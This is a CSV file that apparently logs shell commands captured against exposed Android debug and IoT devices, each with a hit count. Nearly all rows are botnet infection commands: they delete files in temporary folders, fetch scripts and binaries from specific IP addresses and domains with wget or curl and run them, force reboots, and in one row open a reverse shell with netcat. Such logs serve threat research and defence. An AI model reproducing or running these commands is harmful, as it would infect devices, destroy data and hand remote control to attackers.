input,count
cd /data/local/tmp/; rm -rf *; busybox wget http://176.65.140.135/w.sh; sh w.sh; curl http://176.65.140.135/c.sh; sh c.sh,4
cd /data/local/tmp/; rm -rf *; busybox wget http://hailcocks.ru/adb; chmod 777 adb; ./adb android,1
cd /data/local/tmp/; rm -rf *; busybox wget http://www.bluebytenetwork222.win/a-w.sh; sh a-w.sh; curl http://www.bluebytenetwork222.win/a-curl.sh; sh a-curl.sh; wget http://www.bluebytenetwork222.win/a-wget.sh; sh a-wget.sh; rm -rf *; rm -rf *,1
cd /data/local/tmp/; rm -rf *; rm -rf w.sh; rm w.sh; rm -rf c.sh; rm c.sh; busybox wget http://154.216.20.174/w.sh; sh w.sh; curl http://154.216.20.174/c.sh; sh c.sh; rm -rf *,1
cd /data/local/tmp/; rm -rf *; rm -rf w.sh; rm w.sh; rm -rf c.sh; rm c.sh; busybox wget http://45.200.149.77/w.sh; sh w.sh; curl http://45.200.149.77/c.sh; sh c.sh; rm -rf *,51
cd /data/local/tmp/; rm aisuru.aarch64; busybox wget http://80.94.92.172/aisuru.aarch64; chmod 777 aisuru.aarch64; ./aisuru.aarch64 android,3
cd /data/local/tmp/; rm aisuru.arm7; busybox wget http://80.94.92.172/aisuru.arm7; chmod 777 aisuru.arm7; ./aisuru.arm7 android,3
cd /data/local/tmp/; wget http://143.244.175.131/w.sh; sh w.sh; curl http://143.244.175.131/c.sh; sh c.sh,3
cd /data/local/tmp/; wget http://160.22.160.59/bins/scan.sh; sh scan.sh,1
cd /data/local/tmp/; wget http://91.92.247.16/w.sh;chmod 777 w.sh; sh w.sh; curl http:/91.92.247.16/c.sh;chmod 777 c.sh; sh c.sh,3
cd /data/local/tmp/; wget http://94.156.69.235/w.sh;chmod 777 w.sh; sh w.sh; curl http:/94.156.69.235/c.sh;chmod 777 c.sh; sh c.sh,4
cd /data/local/tmp/; wget http://http://sfgjzgjhsfg.ddns.net/bins/a.sh; sh a.sh; curl http://sfgjzgjhsfg.ddns.net/bins/a.sh; sh a.sh,1
cd /data/local/tmp/; wget http://sfgjzgjhsfg.ddns.net/bins/a.sh;chmod 777 *; sh a.sh; curl http://sfgjzgjhsfg.ddns.net/bins/a.sh;chmod 777 *; sh a.sh,1
cd /data/local/tmp/;reboot;,62
cd /data/local/tmp/;rm -rf *;reboot;chmod 777 /sbin/reboot; /sbin/reboot; chmod 777 /bin/reboot; /bin/reboot; /bin/busybox reboot; reboot,3
cd /data/local/tmp/;rm -rf w.sh c.sh; busybox wget http://93.123.85.8/w.sh; sh w.sh; curl http://93.123.85.8/c.sh; sh c.sh,3
cd /data/local/tmp; curl -O http://95.214.27.26:8080/files/xdp.arm7; chmod 777 xdp.arm7; ./xdp.arm7 android,1
cd /data/local/tmp; wget http://156.238.224.214/ada.sh; chmod 777 ada.sh;./ada.sh; rm -rf ada.sh,2
cd /data/local/tmp;echo 0 > tmpf,4
cd /sdcard;wget http://141.98.11.136/z/arm7; chmod 755 arm7 ; ./arm7 adb,3
cd /tmp; curl http://141.98.11.136/z/arm7 -O ;wget http://141.98.11.136/z/arm7; chmod 777 arm7 ; ./arm7 adb,3
cd /tmp; curl http://83.168.110.206/z/arm7 -O ;wget http://77.37.96.100/z/arm7; chmod 777 arm7 ; ./arm7 adb,1
cd /tmp;wget -O- http://85.192.56.29/adb-w;busybox wget -O- http://85.192.56.29/adb-b;curl http://85.192.56.29/adb-c;,2
cd /var/tmp/; wget http://jhbaghjbasdg.shop/askljdghreg/a.sh;chmod 777 *; sh a.sh; curl http://jhbaghjbasdg.shop/askljdghreg/a.sh;chmod 777 *; sh a.sh,1
cd /var/tmp/; wget http://jhbaghjbasdg.shop/nmbxcvasg/a.sh;chmod 777 *; sh a.sh; curl http://jhbaghjbasdg.shop/nmbxcvasg/a.sh;chmod 777 *; sh a.sh,4
cd /var/tmp/;busybox nc 185.196.9.43 9001 -e sh,2
chmod 0755 /data/local/tmp/log,102
chmod 0755 /data/local/tmp/nohup,728
chmod 0755 /data/local/tmp/trinity,625
